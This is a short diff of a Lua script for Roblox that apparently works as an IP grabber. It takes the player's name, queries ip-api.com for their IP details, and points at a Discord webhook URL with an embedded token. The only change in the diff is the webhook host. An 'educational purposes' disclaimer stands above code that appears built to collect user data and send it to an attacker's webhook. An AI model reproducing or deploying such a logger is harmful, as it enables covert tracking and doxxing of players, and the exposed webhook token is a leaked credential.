@@ -1,6 +1,6 @@
 --I DO NOT CONDONE THE MALICIOUS USE OF THIS SCRIPT. THIS IS PURELY FOR EDUCATIONAL PURPOSES AND SHOULD NOT BE USED IN ANY CONTEXT OTHER THAN THAT. PLEASE STAY SAFE AND BE CLEAR OF SCRIPTS THAT MAKE CONTAIN RELATED OR SIMILAR CONTENT.
 local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://ptb.discord.com/api/webhooks/1077981289111638026/ZGHyPVIdW8cp4pYUhaxWTEv6vY8nrPrOIY3NO9vKSg4fy5eYyUv8fRNYoZuxCBfwFYzZ"
+local webhook_url = "https://discord.com/api/webhooks/1077981289111638026/ZGHyPVIdW8cp4pYUhaxWTEv6vY8nrPrOIY3NO9vKSg4fy5eYyUv8fRNYoZuxCBfwFYzZ"
 
 local ip_info = syn.request({
     Url = "http://ip-api.com/json",
